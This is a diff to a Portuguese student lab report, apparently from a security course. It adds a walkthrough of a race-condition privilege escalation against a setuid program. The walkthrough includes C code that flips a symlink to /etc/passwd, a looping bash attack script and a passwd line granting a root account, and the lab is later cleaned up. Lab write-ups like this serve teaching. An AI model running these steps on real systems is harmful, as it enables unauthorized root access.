@@ -97,7 +97,7 @@ SetUID Program
 
 <div style="page-break-after: always"></div>
 
-## 5 Escolher o objetivo
+## 5 Vulnerabilidades Condições de Corrida - Escolher o objetivo
 
 Criar utilizador com permissões de root
 ```sh
@@ -108,10 +108,59 @@ Criar utilizador com permissões de root
    $ ls -l vulp #OUTPUT: -rwsr-xr-x 1 teste seed 7628 Jan 8 07:36 vulp
 ```
 
+**ID**
+```sh
+   $ id # uid=0(root) gid=0(root) groups=0(root)
+```
+
+Com isto demonstrámos como se adiciona um novo utilizador com os previlégios de root.
+Após esta demonstração removemos a ultima linha, que adicionamos, no ficheiro "/etc/passwd".
 <div style="page-break-after: always"></div>
 
+## 6 Vulnerabilidades Condições de Corrida - Executar o atque
+Tendo por objetivo, explorar a vulnerabilidade de condição de corrida e obter o acesso de um utilizador com provilégios root.
 
-## 5 String de formato 2.1
+Para tal, tornámos o ficheiro /tmp/XYZ um link para o ficheiro /etc/passwd, e a vulnerabilidade ocorre no espeço-tempo entre a verificação e utilização.
+```c
+#include <unistd.h>
+//substitute_file.c
+int main(void) {
+	unlink("./XYZ");
+	symlink("/etc/passwd","./XYZ");
+}
+```
+Uma vez que não se pode modificar o programa vulnerável, a única ação possível consiste na execução do ataque em paralelo, em
+"corrida" contra o programa vulnerável, esperando que este vença a condição de corrido, ou seja: modificar o link durante a janela critica.
+
+Infelizmente não é possível prever o timing perfeito, pelo que o sucesso do ataque é probabilístico, sendo que quanto menor a janela critica, menos provável é o
+ataque ter sucesso. Uma hipótese para aumentar a probabilidade de sucesso consiste em executar o programa vulnerável muitas vezes, em simultâneo até obter sucesso no ataque.
+
+Criamos um ficheiro de texto contendo a linha para adicionar o utilizador com privilégios.
+"teste:U6aMy0wojraho:0:0:teste:/root:/bin/bash"
+
+De seguida criámos o ficheiro attack.sh que em vai ser executado enquanto o ficheiro /etc/passwd não for modificado. 
+
+```sh
+#!/bin/bash
+# attack.sh
+CHECK_FILE="ls -l /etc/passwd"
+old=$($CHECK_FILE)
+new=$($CHECK_FILE)
+while [ "$old" == "$new" ] # Check if /etc/passwd is modified
+  do
+    rm ./XYZ
+    true > ./XYZ
+    vulp < passwd_input &
+    ./substitute_file
+    new=$($CHECK_FILE)
+  done
+echo "STOP... The passwd file has been changed"
+
+```
+
+Fizemos diverso testes, e o ataque foi executado com sucesso em menos de 5 segundos em todos os testes. 
+
+## 6 String de formato 2.1
 
 Hexadecimal
 bfb9dfcf.b75392ef.b740be6e.b752ba88.b779fe60.b740bc45.bfb9d544.bfb9d0d4.0d696911.b740bc45.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.
